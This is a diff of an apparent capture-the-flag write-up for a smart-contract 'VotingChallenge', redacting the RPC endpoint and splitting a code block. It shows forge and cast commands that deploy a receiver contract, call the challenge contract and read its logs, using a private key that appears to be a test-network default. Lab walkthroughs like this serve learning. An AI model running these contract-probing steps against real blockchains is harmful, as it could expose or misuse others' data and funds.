@@ -70,7 +70,7 @@ contract VotingChallenge {
 
 The RPC endpoint for interacting with the blockchain is:
 
-http://3.105.27.130:8545
+http://re.da.ct.ed:8545
 
 You can use this RPC endpoint with tools like cast, ethers.js, or web3.py
 📚 Helpful Resources
@@ -125,17 +125,21 @@ And then I gave the contract to the RPC
 
 ```bash
 $ forge create Reciever.sol:Receiver \
-  --rpc-url http://3.105.27.130:8545 \
+  --rpc-url http://re.da.ct.ed:8545 \
   --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --broadcast
 [⠊] Compiling...
 No files changed, compilation skipped
 Deployer: 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC
 Deployed to: 0x663F3ad617193148711d28f5334eE4Ed07016602
 Transaction hash: 0x8cc7c5c08c72c87ca54adb431c99fa20c52845bfc13a833c990fbc5f100cf11d
+```
 
+The next step is to get our contract to call the challenge's contract
+
+```bash
 $ cast send 0x663F3ad617193148711d28f5334eE4Ed07016602 \
   "callViewVotes(address)" 0x5FbDB2315678afecb367f032d93F642f64180aa3 \
-  --rpc-url http://3.105.27.130:8545 \
+  --rpc-url http://re.da.ct.ed:8545 \
   --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a
 
 blockHash            0x0490cb7b6baa11d19ce3ed5086fe5ff1235f78182b2558f12d3dfcf5b9220199
@@ -160,7 +164,7 @@ to                   0x663F3ad617193148711d28f5334eE4Ed07016602
 I then as my `Receiver.receiveDetails` ends up emitting the details, I checked the logs
 
 ```bash
-$ cast logs --address 0x663F3ad617193148711d28f5334eE4Ed07016602 --rpc-url http://3.105.27.130:8545
+$ cast logs --address 0x663F3ad617193148711d28f5334eE4Ed07016602 --rpc-url http://re.da.ct.ed:8545
 - address: 0x663F3ad617193148711d28f5334eE4Ed07016602
   blockHash: 0x0490cb7b6baa11d19ce3ed5086fe5ff1235f78182b2558f12d3dfcf5b9220199
   blockNumber: 3
